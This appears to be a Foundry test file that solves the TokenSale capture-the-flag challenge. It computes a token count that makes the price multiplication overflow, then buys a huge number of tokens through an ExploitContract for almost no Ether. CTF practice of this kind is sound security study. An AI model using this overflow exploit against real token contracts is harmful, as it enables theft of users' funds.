// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/TokenSale.sol";

contract TokenSaleTest is Test {
    TokenSale public tokenSale;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        tokenSale = (new TokenSale){value: 1 ether}();
        exploitContract = new ExploitContract(tokenSale);
        vm.deal(address(exploitContract), 5 ether);
    }

    // Use the instance of tokenSale and exploitContract
    function tesTokenSale() public {
        uint256 PRICE_PER_TOKEN = 1 ether;
        uint256 numTokensToTriggerOverFlow = (type(uint256).max / PRICE_PER_TOKEN) + 1;
        // must send Exact Ether
        uint256 exactEther;
        unchecked {
            exactEther = numTokensToTriggerOverFlow * PRICE_PER_TOKEN;
        }
        console.log("exactEther:", exactEther);
        exploitContract.attack{value: exactEther}(numTokensToTriggerOverFlow);

        console.log("balance:", tokenSale.balanceOf(address(exploitContract)));
        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenSale.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
